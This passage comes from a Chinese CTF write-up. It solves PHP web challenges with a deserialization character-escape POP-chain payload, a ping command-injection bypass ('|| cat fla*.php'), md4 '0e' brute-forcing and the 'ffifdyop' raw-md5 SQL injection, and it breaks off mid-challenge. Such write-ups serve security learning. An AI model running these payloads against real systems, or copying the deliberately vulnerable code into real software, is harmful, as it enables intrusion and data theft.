class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line">@$player = unserialize(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</div><div class="line">print_r($player);</div><div class="line"><span class="keyword">if</span> ($player-&gt;get_admin() === <span class="number">1</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"FPX Champion\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"The Shy unstoppable\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $user;</div><div class="line">    <span class="keyword">protected</span> $pass;</div><div class="line">    <span class="keyword">protected</span> $admin;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;user = $user;</div><div class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</div><div class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</div><div class="line">            $name = <span class="keyword">$this</span>-&gt;name;</div><div class="line">            $name();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;TP();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;Gank();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</div><div class="line">        system(<span class="string">"cat /flag"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;KS();  </div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>主要代码及功能：<br>index.php接收传入的<code>$_GET[&#39;username&#39;]</code>和<code>$_GET[&#39;password&#39;]</code>变量，创建player对象，经过serialize序列化后写入<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件</p><p>play.php读取<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件内容，将文件中序列化字符串进行反序列化，打印</p><p>class.php当中定义了一些类，并存在可利用的反序列化pop链</p><p>common.php主要对序列化和反序列化的数据流进行一些检查和处理</p><p>正常情况下，写入文件的序列化内容是不可控的，但是这里由于common.php当中的read函数会在字符串反序列化之前将序列化字符串当中的<code>\0*\0</code>替换为<code>chr(0).&quot;*&quot;.chr(0)</code>，从5个字符变成了3个字符，导致处理后的字符串在反序列化时，字符串属性值长度大于实际的长度，产生字符逃逸，导致之后的序列化字符串内容可控</p><p>字符逃逸测试，尝试将player的<code>$admin</code>属性值变成1，该值本来是不可控的，这里尝试通过字符逃逸将其变为可控</p><p><img src="http://pic.c1imber.top/blog/20200824/yvHWtwz0yeOG.png?imageslim" alt="mark"></p><p>传入：</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}</code></pre><p>可以看到$admin的值被改变为了1，输出FPX Champion</p><p><img src="http://pic.c1imber.top/blog/20200824/xtRsQDnVI4lz.png?imageslim" alt="mark"></p><p>文件当中的序列化字符串：</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;\0*\0user&quot;;s:55:&quot;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&quot;;s:7:&quot;\0*\0pass&quot;;s:50:&quot;&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre><p>经过read函数处理后（为了方便表示，这里protected属性名中的不可见字符用0表示）</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}&quot;;s:8:&quot;0*0admin&quot;;i:0;}</code></pre><p><code>\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</code></p><p>由长度55变为了</p><p><code>0*00*00*00*00*00*00*00*00*00*00*0长度33</code></p><p><code>&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;</code>为逃逸的字符，长度为55-33，22</p><p>逃逸的字符之后的序列化字符串就变为可控内容了，可以通过$_GET[‘password’]构造可控的序列化字符串</p><p>php序列化字符串遇到}后完成反序列化，实际反序列化字符串为</p><pre><code>O:6:&quot;player&quot;:3：{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}object(__PHP_Incomplete_Class)#1 (4) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(6) &quot;player&quot; [&quot;user&quot;:protected]=&gt; string(55) &quot;***********&quot;;s:7:&quot;*pass&quot;;s:50:&quot;&quot; [&quot;pass&quot;:protected]=&gt; string(3) &quot;111&quot; [&quot;admin&quot;:protected]=&gt; int(1) }</code></pre><p>根据class.php构造pop链</p><p>最终需要触发的地方为jungle对象的KS方法当中的<code>system(&#39;cat /flag&#39;)</code>-&gt;</p><p>jungle对象的<code>__toString</code>魔术方法刚好调用了KS方法-&gt;</p><p><code>__toString</code>魔术方法在对象被当作字符串时触发，所以需要找到一个jungle对象有可能被当作字符串的位置-&gt;</p><p>在midsolo对象的Gank方法当中，使用了stristr字符串函数，如果将这里midsolo对象的$name属性设置为jungle对象，就可以触发jungle的<code>__toString</code>-&gt;</p><p>midsolo对象的<code>__invoke</code>魔术方法刚好调用了Gank方法，<code>__invoke</code>魔术方法在其对象被作为函数调用时触发-&gt;</p><p>很容易可以找到topsolo对象的TP方法，这里调用了<code>$name()</code>，如果将topsolo对象的$name属性设置为midsolo对象，就能触发midsolo的<code>__invoke</code>-&gt;</p><p>而刚好topsolo的<code>__destruct</code>调用了topsolo的TP方法，所以这里可以作为pop链的起点</p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    </div><div class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$obj=<span class="keyword">new</span> topsolo();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><pre><code>O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>修改payload</p><p>1、存在不可见字符，修改成</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>2、midsolo的<code>__walkup</code>方法要求$name必须为Yasuo，所以需要绕过<code>__walkup</code>方法<br>改为：</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>3、common.php当中的check函数要求序列化字符串当中不能存在name</p><p>把n改为\6e</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>最终传入</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:8:&quot;\0*\0admin&quot;;i:1;S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/d8wxX2yFHQU2.png?imageslim" alt="mark"></p><p>访问play.php获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/5HLVOwJA1qKC.png?imageslim" alt="mark"></p><h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>preg_match检查<code>$_GET[&quot;ip&quot;]</code>当中不能有flag字符串，直接用linux通配符就能绕过</p><p><code>http://xxx/?ip=1.1.1.1%20||%20cat%20fla*.php</code></p><p><img src="http://pic.c1imber.top/blog/20200824/piMpGWj02C6D.png?imageslim" alt="mark"></p><h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"><span class="comment">//level 1</span></div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 2</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 3</span></div><div class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</div><div class="line">$result = $mysqli-&gt;query($query);</div><div class="line">$row = $result-&gt;fetch_assoc(); </div><div class="line">var_dump($row);</div><div class="line">$result-&gt;free();</div><div class="line">$mysqli-&gt;close();</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>evel1这里本来想传入空数组去绕过的，因为hash函数参数为数组时会产生错误，导致hash运算结果为NULL，所以如果传入空数组的话两者就相等了，但是试了半天却发现不行</p><p>而下面的代码是可以的</p><p><img src="http://pic.c1imber.top/blog/20200824/Y6nYJ9knFi0M.png?imageslim" alt="mark"></p><p>于是在这里卡了好久，最后才发现问题出在了哪</p><p><strong>因为通过<code>$_GET</code>方式传入空数组和直接定义空数组是有区别的</strong></p><p>通过<code>$_GET</code>方式传入数组，数组里有个默认的元素，内容为空字符串，所以即使<code>_GET</code>传入了空数组，但是其实这里的<code>$_GET[&#39;hash1&#39;]</code>并不是真正的空数组，而是<code>array(1) { [0]=&gt; string(0) &quot;&quot; }</code>，所以这里两者并不相等</p><p>在本地<code>var_dump($_GET[&#39;hash1&#39;])</code>就知道了</p><p><img src="http://pic.c1imber.top/blog/20200824/i3GbyqKOzpvn.png?imageslim" alt="mark"></p><p>所以这里需要换一下思路</p><p>这里lelvel1要求<code>$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])</code></p><p>而php弱类型当中还有一个特性是<code>&quot;0e\d+&quot;==&quot;0e\d+&quot;</code>的结果是为true的，因为两个字符串都以0e开头且后面的字符均为数字，php在通过==比较时会将两个字符串都转为科学计数法,于是两个结果都是0，所以相等</p><p><img src="http://pic.c1imber.top/blog/20200824/rUX1XczPPl9R.png?imageslim" alt="mark"></p><p>那么这里需要找一个字符串，符合以下条件的：</p><p>1、字符串需要以0e开头，且之后的字符都是数字</p><p>2、该字符串md4后的结果也需要为0e开头，且后面均为数字</p><p>这样只能爆破了，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</div><div class="line"> </div><div class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</div><div class="line">    <span class="keyword">if</span> (hash(<span class="string">"md4"</span>,<span class="string">"0e"</span>. $i) == $hash) &#123;</div><div class="line">        <span class="keyword">echo</span> $i;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">echo</span> <span class="string">'  done'</span>;</div></pre></td></tr></table></figure><p>十几分钟就爆破成功了</p><p><img src="http://pic.c1imber.top/blog/20200824/JOYhnsKbeEF6.png?imageslim" alt="mark"></p><p>得到符合条件的字符串：0e251288019</p><p><img src="http://pic.c1imber.top/blog/20200824/3vFzMhWgpGGd.png?imageslim" alt="mark"></p><p>level2比较简单，<code>$_GET[&#39;hash2&#39;]</code>和<code>$_GET[&#39;hash3&#39;]</code>均为空数组即可绕过</p><p>level3接收参数拼接SQL语句，直接查询flag，语句如下</p><p><code>&quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;</code></p><p>需要 <code>md5($_GET[&quot;hash4&quot;],true)</code>可控，这里的true返回的是md5后的二进制数据</p><p>找到了一篇文章，文章中提到了一个神奇的字符串：<code>ffifdyop</code>，该字符串<code>md5(xxx,true)</code>后的结果为<code>&#39;&#39;or&#39;二进制数据&#39;</code>，导致可以注入查询所有内容</p><p>文章连接：<br><a href="https://blog.csdn.net/solitudi/article/details/107813286" target="_blank" rel="external">https://blog.csdn.net/solitudi/article/details/107813286</a></p><p><img src="http://pic.c1imber.top/blog/20200824/IzEUegw2OTKP.png?imageslim" alt="mark"></p><p>所以最终结果为：</p><p><code>http://xxx/index.php?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/jl0lvpPTepbq.png?imageslim" alt="mark"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="half-infiltration（赛后做出）"><a href="#half-infiltration（赛后做出）" class="headerlink" title="half_infiltration（赛后做出）"></a>half_infiltration（赛后做出）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ob_start();</div><div class="line">        <span class="keyword">global</span> $result;</div><div class="line">        <span class="keyword">print</span> $result;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $student = <span class="keyword">$this</span>-&gt;age;</div><div class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</div><div class="line">        $a = <span class="keyword">$this</span>-&gt;num;</div><div class="line">    $student-&gt;$boy();</div><div class="line">    <span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</div><div class="line">    &#123;</div><div class="line">        ob_end_clean();</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">global</span> $$a;</div><div class="line">    $result=$GLOBALS[<span class="string">'flag'</span>];</div><div class="line">        ob_end_clean();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</div><div class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>第一步需要读出ssrf.php，在这卡了好久</p><p>首先：</p><p>尝试传入<code>x=O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;sex&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}</code></p><p>过程如下：</p><p>触发User对象的<code>__destruct</code>方法，从而调用Pass对象的read方法，<code>ob_start()</code>开启缓冲区，这时<code>global $result</code>结果为NULL，<code>print 